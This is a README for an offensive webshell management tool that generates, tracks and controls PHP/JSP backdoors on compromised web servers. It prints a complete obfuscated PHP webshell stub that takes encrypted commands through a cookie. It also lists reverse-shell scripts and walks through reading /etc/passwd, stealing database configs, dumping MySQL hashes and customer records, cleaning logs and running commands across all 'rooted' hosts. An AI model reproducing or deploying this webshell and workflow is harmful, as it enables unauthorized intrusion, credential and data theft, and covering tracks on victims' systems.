# Summary

Command line interface to create and control minimalistic php/jsp shells.

* searchable and editable shell database
 - alias
 - comment
 - geoip
 - domain
* shell information
 - pr
 - tic
 - creation time
 - access time
* shell manager
 - execute command or script on all shells
 - execute command or script on a selection of shells
* overall stats
 - total shells
 - unique hosts
* utility commands
 - cd
 - edit
 - upload
 - download
 - touch
 - sed log cleaner
* tab autocompletion
* bash scripts
```
info         - gather general information (runs on login)
php          - list interesting php settings
av           - detect common security software
kernel       - kernel info
tech         - detect useful software
dir          - list contents of interesting dirs
global_suid  - find all suid files
global_sgid  - find all sgid files
global_write - find globally writeable files belonging to other users
users        - list users
users_home   - list contents of all $HOME dirs
users_file   - list interesting files from all $HOME dirs
users_write  - find writeable files in all $HOME dirs recursively
users_read   - find readable files in all $HOME dirs recursively
process      - list all processes
demo         - reference for syntax quirks(!)
```
* backconnects
```
bash_dev.sh     [ip] [port]
nc_e.sh         [ip] [port]
nc_mknod.sh     [ip] [port]
php.sh          [ip] [port]
pl.sh           [ip] [port]
pl_sys.sh       [ip] [port]
py.sh           [ip] [port]
rb.sh           [ip] [port]
rb_popen.sh     [ip] [port]
telnet_mknod.sh [ip] [port]
telnet_split.sh [ip] [stdin-port] [stdout-port]
```

## PHP shell

* commands encrypted (badly!) and passed via cookies
* uploads optionally sent via post
* embeddable into other scripts
* error messages hidden
* shell.php stub executes php payloads via include
* shell.php stub delegates os cmd invokation to payloads
* b64.php cryptor obfuscates stub via psuedo-random variables and create_function
* php scripts
```
ls.php          - list files
cat.php         - cat file
drivers.php     - list available database drivers
tree_table.php  - show db hierarchy down to tables [driver] [username] [password]
tree_column.php - show db hierarchy down to colums [driver] [username] [password]
db.php          - show databases    [driver] [username] [password]
table.php       - show tables       [driver] [username] [password] [database]
column.php      - show columns      [driver] [username] [password] [database] [table]
pdo.php         - query database    [driver] [username] [password] [query]
loot_mysql.php  - dump mysql hashes [username] [password]
```

Typical shell (shell.php stub and b64.php cryptor):

```
<?
$dYtKLa=null;
$XmzZZB='n5fgacrn5fgaean5fgate_fn5fgan5fgaunctin5fgaonn5fga';
$myC_YojOmE=str_replace('n5fga',$dYtKLa,$XmzZZB);
$bXxLybtZj='base25aWp25aWp625aWp4_25aWpd25aWp25aWpecod25aWpe25aWp';
$QRGzlAVFD=str_replace('25aWp',$dYtKLa,$bXxLybtZj);
$RMWnbJn_mqQ='CS8qd0lhWSovZnVuY3Rpb24gZW5jcnlwdCgka2V5LCRwYXNzLCRzdHIpeyRpc2VtcHR5PWVtcHR5KCRzdHIpfHxAZ3p1bmNvbXByZXNzKCRzdHIpPT09Jyc7JHN0cj0kcGFzcy4kc3RyOyRrZXlzaXplPXN0cmxlbigka2V5KTtmb3IoJGlpPTA7JGlpPCRrZXlzaXplOyRpaSsrKXskc3RyPWNocihtdF9yYW5kKCklMjU2KS4kc3RyO31mb3IoJGlpPTAsJHJlc3VsdD0nJywkY3VycmVudD0wOyRpaTxzdHJsZW4oJHN0cik7JGlpKyspeyRjdXJyZW50PW9yZCgkc3RyWyRpaV0pXkBvcmQoJGtleVskaWklJGtleXNpemVdKV4kY3VycmVudDskcmVzdWx0Lj1jaHIoJGN1cnJlbnQpO31yZXR1cm4oISRpc2VtcHR5KT8kcmVzdWx0OicnO31mdW5jdGlvbiBkZWNyeXB0KCRrZXksJHBhc3MsJHN0cil7JGtleXNpemU9c3RybGVuKCRrZXkpO2ZvcigkaWk9MCwkcmVzdWx0PScnLCRjdXJyZW50PTA7JGlpPHN0cmxlbigkc3RyKTskaWkrKyl7JHJlc3VsdC49Y2hyKG9yZCgkc3RyWyRpaV0pXkBvcmQoJGtleVskaWklJGtleXNpemVdKV4kY3VycmVudCk7JGN1cnJlbnQ9b3JkKCRzdHJbJGlpXSk7fXJldHVybighZW1wdHkoJHN0cikmJnN1YnN0cigkcmVzdWx0LCRrZXlzaXplLCRrZXlzaXplKT09PSRwYXNzKT9zdWJzdHIoJHJlc3VsdCwyKiRrZXlzaXplKTonJzt9ZnVuY3Rpb24gc2hlbGwoKSB7QG9iX3N0YXJ0KCk7JGtleT1wYWNrKCdIKicsJzlhNjQyYzRjM2VlMThhMThmY2JlN2E5NTEwMDRjOGVhJyk7JHBhc3M9cGFjaygnSConLCc2YzBkMGQ5MzAzZWU0MjQ0NDhmMTRmYWMxZGZmY2Y4YScpOyRtb2Q9QGd6dW5jb21wcmVzcyhkZWNyeXB0KCRrZXksJHBhc3MscGFjaygnSConLEBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKSkpKTskY21kPUBnenVuY29tcHJlc3MoZGVjcnlwdCgka2V5LCRwYXNzLHBhY2soJ0gqJyxAJF9DT09LSUVbJ1BIUFNFU1NJRCddKSkpOyR0bXA9dGVtcG5hbShudWxsLG51bGwpO2ZpbGVfcHV0X2NvbnRlbnRzKCR0bXAsJzw/cGhwICcuJG1vZC4kY21kLicgPz4nKTt0cnl7aW5jbHVkZSgkdG1wKTt9Y2F0Y2goRXhjZXB0aW9uICRlKXt9JHI9dW5wYWNrKCdIKicsZW5jcnlwdCgka2V5LCRwYXNzLEBnemNvbXByZXNzKEBvYl9nZXRfY2xlYW4oKSw5KSkpO2VjaG8gJHJbMV07fXNoZWxsKCk7';
$jTOWXgk=$myC_YojOmE($dYtKLa,$QRGzlAVFD($RMWnbJn_mqQ));
$jTOWXgk();
?>
```

## JSP Shell

Development ongoing!

* commands converted to hex and passed via cookies

# Install

```
virtualenv env
. env/bin/activate
pip install -r requirements
```

# Usage

```
./shell.py
```
and 
```
help
```

Create a php shell:

```
./shell.py
load shellallthethings
use shell
options
set url http://domain.tld/shell.php
set alias haxhaxhax
set action PHPS3SS1D
set comment 1337
set outfile /tmp/shell.php
generate shell.php
```

Change the url for @haxhaxhax shell:

```
url @haxhaxhax http://domain.tld/images/1.php
```

List shells:

```
list
```

View info about @haxhaxhax:

```
info @haxhaxhax
```

Connect to shell:

```
connect @haxhaxhax
```

Execute commands:

```
ls
pwd
id
uname -a
cat /etc/passwd
```

Shell mode uses a special `@` escape symbol for commands.

View help:

```
@help
```

Change dir to `/tmp`:

```
@cd /tmp
```

Change dir to `$home`:

```
@cd
```

Relative dirs are also supported:

```
@cd ../
```

Touch shell:

```
@touch
```

Download file:

```
@download cms/config/db.php /tmp/db.php
```

Run custom php code:

```
@eval { echo "haxhaxhax"; }
```

Run a php script (contrary to the cmd name, the script is actually uploaded to a tmp dir and included, not eval'ed):

```
@eval php.php
```

View available database drivers:

```
@eval drivers.php
```

View the db hierarchy:

```
@eval tree_table.php mysql toor E1!t3
```

Run a custom query:

```
@eval pdo.php mysql toor E1!t3 "select * from cms.customers;"
```

Run a bash script:

```
@script tech
```

Depending on the output choose a relevant backconnect:

```
@backconnect telnet_mknod.sh 192.168.0.1 4444
```

Connection issues can be mitagated by choosing a different port or a different backconnect.

Change transport method to `post` for file uploads (>4kb):

```
@options
@set transport post
```

Upload file:

```
@upload /tmp/proxy.php 2.php
```

Binary files need to be encoded to base64:

```
base64 exploit > xpl.b64
```

And then decoded server side:

```
base64 -d xpl.b64 > exploit
```

Support for binary uploads is planned. If all else fails (ie no base64 on the server) then you can write a quick php script to make the upload.

Set transport method to default value:

```
@unset transport
```

Edit a file (will download file, launch your editor, check if changes were made and overwrite existing version):

```
@edit hacked.txt
```

Leave shell via ctrl+c.

Create a comment for @haxhaxhax:

```
comment @haxhaxhax "lulz rooted"
```

Search for shells by comment and domain:

```
search comment:"rooted" domain:*.tld
```

Execute script on all shells:

```
select domain:*|script kernel
```

Execute command on specific shells:

```
select comment:rooted|cmd uname -a;id
```

Run `help` command for more information (on each module).
